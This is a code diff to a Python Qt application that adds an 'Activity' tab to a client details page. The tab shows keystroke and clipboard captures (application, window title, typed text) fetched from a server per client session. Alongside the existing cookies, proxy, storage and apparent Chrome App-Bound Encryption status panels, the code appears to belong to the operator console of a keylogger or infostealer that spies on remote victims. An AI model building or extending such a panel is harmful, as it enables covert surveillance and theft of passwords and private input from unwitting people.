@@ -136,12 +136,14 @@ class ClientDetailsPage(QtWidgets.QWidget):
         self.cookies_tab = QtWidgets.QWidget()
         self.proxy_tab = QtWidgets.QWidget()
         self.storage_tab = QtWidgets.QWidget()
+        self.activity_tab = QtWidgets.QWidget()
         self.tab_stack.addWidget(self.main_tab)
         self.tab_stack.addWidget(self.cookies_tab)
         self.tab_stack.addWidget(self.proxy_tab)
         self.tab_stack.addWidget(self.storage_tab)
+        self.tab_stack.addWidget(self.activity_tab)
 
-        for index, key in enumerate(["main", "cookies", "proxy", "storage"]):
+        for index, key in enumerate(["main", "cookies", "proxy", "storage", "activity"]):
             button = make_button("", "ghost")
             button.setCheckable(True)
             self.tab_group.addButton(button, index)
@@ -160,6 +162,7 @@ class ClientDetailsPage(QtWidgets.QWidget):
         self._build_cookies_tab()
         self._build_proxy_tab()
         self._build_storage_tab()
+        self._build_activity_tab()
         self.apply_translations()
 
     def apply_translations(self) -> None:
@@ -172,6 +175,7 @@ class ClientDetailsPage(QtWidgets.QWidget):
         self.tab_buttons["cookies"].setText(self.i18n.t("client_tab_cookies"))
         self.tab_buttons["proxy"].setText(self.i18n.t("client_tab_proxy"))
         self.tab_buttons["storage"].setText(self.i18n.t("client_tab_storage"))
+        self.tab_buttons["activity"].setText(self.i18n.t("client_tab_activity"))
         self.client_info_title.setText(self.i18n.t("client_info_title"))
         self.system_info_title.setText(self.i18n.t("client_system_title"))
         self.cookies_title.setText(self.i18n.t("client_cookies_title"))
@@ -188,6 +192,13 @@ class ClientDetailsPage(QtWidgets.QWidget):
         self.work_status_label.setText(self.i18n.t("client_work_status"))
         self.tags_label.setText(self.i18n.t("client_tags_title"))
         self.tags_hint.setText(self.i18n.t("client_tags_hint"))
+        # Activity tab translations
+        if hasattr(self, "activity_title"):
+            self.activity_title.setText(self.i18n.t("activity_title"))
+            self.activity_search.setPlaceholderText(self.i18n.t("activity_search_placeholder"))
+            self.activity_refresh_btn.setText(self.i18n.t("activity_refresh"))
+            self.activity_delete_all_btn.setText(self.i18n.t("activity_delete_all"))
+            self._update_activity_type_filter()
         if hasattr(self, "abe_title"):
             self.abe_title.setText(self.i18n.t("abe_status_title"))
             self.abe_status_label.setText(self.i18n.t("abe_status_label"))
@@ -773,6 +784,317 @@ class ClientDetailsPage(QtWidgets.QWidget):
         self.storage_action.clicked.connect(self._open_storage)
         card_layout.addWidget(self.storage_action, alignment=QtCore.Qt.AlignmentFlag.AlignLeft)
         layout.addWidget(self.storage_card)
+
+    def _build_activity_tab(self) -> None:
+        """Build the Activity Log tab UI."""
+        layout = QtWidgets.QVBoxLayout(self.activity_tab)
+        layout.setSpacing(12)
+        layout.setContentsMargins(0, 0, 0, 0)
+
+        # Header with title and controls
+        header = GlassFrame(radius=16, tone="card", tint_alpha=150, border_alpha=60)
+        header_layout = QtWidgets.QVBoxLayout(header)
+        header_layout.setContentsMargins(14, 14, 14, 14)
+        header_layout.setSpacing(12)
+
+        # Title row
+        title_row = QtWidgets.QHBoxLayout()
+        self.activity_title = QtWidgets.QLabel()
+        self.activity_title.setStyleSheet("font-weight: 600; font-size: 14px;")
+        title_row.addWidget(self.activity_title)
+        title_row.addStretch()
+        
+        # Total count label
+        self.activity_total_label = QtWidgets.QLabel()
+        self.activity_total_label.setObjectName("Muted")
+        title_row.addWidget(self.activity_total_label)
+        header_layout.addLayout(title_row)
+
+        # Filter row
+        filter_row = QtWidgets.QHBoxLayout()
+        filter_row.setSpacing(8)
+
+        # Search input
+        self.activity_search = QtWidgets.QLineEdit()
+        self.activity_search.setMinimumWidth(200)
+        self.activity_search.textChanged.connect(self._on_activity_search_changed)
+        filter_row.addWidget(self.activity_search)
+
+        # Type filter dropdown
+        self.activity_type_filter = QtWidgets.QComboBox()
+        self.activity_type_filter.setMinimumWidth(120)
+        self.activity_type_filter.currentIndexChanged.connect(self._on_activity_filter_changed)
+        filter_row.addWidget(self.activity_type_filter)
+
+        # Application filter dropdown
+        self.activity_app_filter = QtWidgets.QComboBox()
+        self.activity_app_filter.setMinimumWidth(150)
+        self.activity_app_filter.currentIndexChanged.connect(self._on_activity_filter_changed)
+        filter_row.addWidget(self.activity_app_filter)
+
+        filter_row.addStretch()
+
+        # Action buttons
+        self.activity_refresh_btn = make_button("", "ghost")
+        self.activity_refresh_btn.clicked.connect(self._refresh_activity_logs)
+        filter_row.addWidget(self.activity_refresh_btn)
+
+        self.activity_delete_all_btn = make_button("", "danger")
+        self.activity_delete_all_btn.clicked.connect(self._delete_all_activity_logs)
+        filter_row.addWidget(self.activity_delete_all_btn)
+
+        header_layout.addLayout(filter_row)
+        layout.addWidget(header)
+
+        # Activity logs table
+        self.activity_table = QtWidgets.QTableWidget()
+        self.activity_table.setColumnCount(5)
+        self.activity_table.setHorizontalHeaderLabels([
+            self.i18n.t("activity_col_time"),
+            self.i18n.t("activity_col_app"),
+            self.i18n.t("activity_col_window"),
+            self.i18n.t("activity_col_input"),
+            self.i18n.t("activity_col_type"),
+        ])
+        self.activity_table.setSelectionBehavior(QtWidgets.QAbstractItemView.SelectionBehavior.SelectRows)
+        self.activity_table.setSelectionMode(QtWidgets.QAbstractItemView.SelectionMode.ExtendedSelection)
+        self.activity_table.setAlternatingRowColors(True)
+        self.activity_table.verticalHeader().setVisible(False)
+        self.activity_table.setEditTriggers(QtWidgets.QAbstractItemView.EditTrigger.NoEditTriggers)
+        
+        # Column widths
+        header_view = self.activity_table.horizontalHeader()
+        header_view.setSectionResizeMode(0, QtWidgets.QHeaderView.ResizeMode.ResizeToContents)
+        header_view.setSectionResizeMode(1, QtWidgets.QHeaderView.ResizeMode.ResizeToContents)
+        header_view.setSectionResizeMode(2, QtWidgets.QHeaderView.ResizeMode.Interactive)
+        header_view.setSectionResizeMode(3, QtWidgets.QHeaderView.ResizeMode.Stretch)
+        header_view.setSectionResizeMode(4, QtWidgets.QHeaderView.ResizeMode.ResizeToContents)
+        
+        layout.addWidget(self.activity_table, 1)
+
+        # Load more button
+        self.activity_load_more_btn = make_button(self.i18n.t("activity_load_more"), "ghost")
+        self.activity_load_more_btn.clicked.connect(self._load_more_activity_logs)
+        self.activity_load_more_btn.setVisible(False)
+        layout.addWidget(self.activity_load_more_btn, alignment=QtCore.Qt.AlignmentFlag.AlignCenter)
+
+        # Empty state label
+        self.activity_empty_label = QtWidgets.QLabel()
+        self.activity_empty_label.setObjectName("Muted")
+        self.activity_empty_label.setAlignment(QtCore.Qt.AlignmentFlag.AlignCenter)
+        self.activity_empty_label.setVisible(False)
+        layout.addWidget(self.activity_empty_label)
+
+        # State
+        self._activity_logs: list[dict] = []
+        self._activity_total = 0
+        self._activity_offset = 0
+        self._activity_limit = 50
+
+    def _update_activity_type_filter(self) -> None:
+        """Populate type filter dropdown."""
+        current = self.activity_type_filter.currentData()
+        self.activity_type_filter.clear()
+        self.activity_type_filter.addItem(self.i18n.t("activity_filter_all"), "")
+        self.activity_type_filter.addItem(self.i18n.t("activity_filter_keystroke"), "keystroke")
+        self.activity_type_filter.addItem(self.i18n.t("activity_filter_clipboard"), "clipboard")
+        if current:
+            idx = self.activity_type_filter.findData(current)
+            if idx >= 0:
+                self.activity_type_filter.setCurrentIndex(idx)
+
+    def _refresh_activity_logs(self) -> None:
+        """Refresh activity logs from server."""
+        if not self.client or not self.api:
+            return
+        
+        client_id = self.client.get("id")
+        if not client_id:
+            return
+
+        self._activity_offset = 0
+        self._load_activity_logs(reset=True)
+
+    def _load_activity_logs(self, reset: bool = False) -> None:
+        """Load activity logs from API."""
+        if not self.client or not self.api:
+            return
+
+        client_id = self.client.get("id")
+        if not client_id:
+            return
+
+        try:
+            # Get filter values
+            search = self.activity_search.text().strip() or None
+            entry_type = self.activity_type_filter.currentData() or None
+            app_filter = self.activity_app_filter.currentData() or None
+
+            result = self.api.fetch_activity_logs(
+                session_id=client_id,
+                limit=self._activity_limit,
+                offset=self._activity_offset,
+                entry_type=entry_type,
+                application=app_filter,
+                search=search,
+            )
+
+            logs = result.get("logs", [])
+            self._activity_total = result.get("total", 0)
+
+            if reset:
+                self._activity_logs = logs
+            else:
+                self._activity_logs.extend(logs)
+
+            self._activity_offset += len(logs)
+            self._render_activity_table()
+            self._update_activity_applications()
+
+        except Exception as e:
+            self._activity_logs = []
+            self._activity_total = 0
+            self._render_activity_table()
+
+    def _load_more_activity_logs(self) -> None:
+        """Load more activity logs."""
+        self._load_activity_logs(reset=False)
+
+    def _on_activity_search_changed(self) -> None:
+        """Handle search input change."""
+        self._activity_offset = 0
+        self._load_activity_logs(reset=True)
+
+    def _on_activity_filter_changed(self) -> None:
+        """Handle filter dropdown change."""
+        self._activity_offset = 0
+        self._load_activity_logs(reset=True)
+
+    def _update_activity_applications(self) -> None:
+        """Update application filter dropdown."""
+        if not self.client or not self.api:
+            return
+
+        client_id = self.client.get("id")
+        if not client_id:
+            return
+
+        try:
+            current = self.activity_app_filter.currentData()
+            apps = self.api.fetch_activity_applications(client_id)
+            
+            self.activity_app_filter.blockSignals(True)
+            self.activity_app_filter.clear()
+            self.activity_app_filter.addItem(self.i18n.t("activity_filter_app"), "")
+            for app in apps:
+                self.activity_app_filter.addItem(app, app)
+            
+            if current:
+                idx = self.activity_app_filter.findData(current)
+                if idx >= 0:
+                    self.activity_app_filter.setCurrentIndex(idx)
+            self.activity_app_filter.blockSignals(False)
+        except Exception:
+            pass
+
+    def _render_activity_table(self) -> None:
+        """Render activity logs in table."""
+        self.activity_table.setRowCount(0)
+        
+        # Update total label
+        self.activity_total_label.setText(
+            self.i18n.t("activity_total").replace("{count}", str(self._activity_total))
+        )
+
+        if not self._activity_logs:
+            self.activity_table.setVisible(False)
+            self.activity_empty_label.setText(self.i18n.t("activity_no_logs"))
+            self.activity_empty_label.setVisible(True)
+            self.activity_load_more_btn.setVisible(False)
+            return
+
+        self.activity_table.setVisible(True)
+        self.activity_empty_label.setVisible(False)
+
+        for log in self._activity_logs:
+            row = self.activity_table.rowCount()
+            self.activity_table.insertRow(row)
+
+            # Time
+            timestamp = log.get("timestamp", "")
+            time_str = self._format_activity_time(timestamp)
+            time_item = QtWidgets.QTableWidgetItem(time_str)
+            time_item.setData(QtCore.Qt.ItemDataRole.UserRole, log.get("id"))
+            self.activity_table.setItem(row, 0, time_item)
+
+            # Application
+            app = log.get("application", "Unknown")
+            self.activity_table.setItem(row, 1, QtWidgets.QTableWidgetItem(app))
+
+            # Window title
+            window = log.get("window_title", "")
+            window_item = QtWidgets.QTableWidgetItem(window)
+            window_item.setToolTip(window)
+            self.activity_table.setItem(row, 2, window_item)
+
+            # Input text
+            input_text = log.get("input_text", "")
+            input_item = QtWidgets.QTableWidgetItem(input_text)
+            input_item.setToolTip(input_text)
+            self.activity_table.setItem(row, 3, input_item)
+
+            # Type
+            entry_type = log.get("entry_type", "keystroke")
+            type_text = "📋" if entry_type == "clipboard" else "⌨️"
+            self.activity_table.setItem(row, 4, QtWidgets.QTableWidgetItem(type_text))
+
+        # Show load more if there are more logs
+        has_more = len(self._activity_logs) < self._activity_total
+        self.activity_load_more_btn.setVisible(has_more)
+
+    def _format_activity_time(self, timestamp: str) -> str:
+        """Format timestamp for display."""
+        if not timestamp:
+            return "--"
+        try:
+            # Parse ISO format
+            if timestamp.endswith("Z"):
+                timestamp = timestamp[:-1] + "+00:00"
+            dt = datetime.fromisoformat(timestamp)
+            if dt.tzinfo:
+                dt = dt.astimezone()
+            now = datetime.now(dt.tzinfo) if dt.tzinfo else datetime.now()
+            if dt.date() == now.date():
+                return dt.strftime("%H:%M:%S")
+            return dt.strftime("%Y-%m-%d %H:%M:%S")
+        except Exception:
+            return str(timestamp)[:19]
+
+    def _delete_all_activity_logs(self) -> None:
+        """Delete all activity logs for the client."""
+        if not self.client or not self.api:
+            return
+
+        client_id = self.client.get("id")
+        if not client_id:
+            return
+
+        reply = QtWidgets.QMessageBox.question(
+            self,
+            self.i18n.t("activity_delete_title"),
+            self.i18n.t("activity_delete_all_body"),
+            QtWidgets.QMessageBox.StandardButton.Yes | QtWidgets.QMessageBox.StandardButton.No,
+            QtWidgets.QMessageBox.StandardButton.No,
+        )
+
+        if reply != QtWidgets.QMessageBox.StandardButton.Yes:
+            return
+
+        try:
+            self.api.delete_activity_logs(client_id)
+            self._refresh_activity_logs()
+        except Exception:
+            pass
 
     def _build_cookies_menu(self) -> None:
         menu = QtWidgets.QMenu(self.cookies_button)
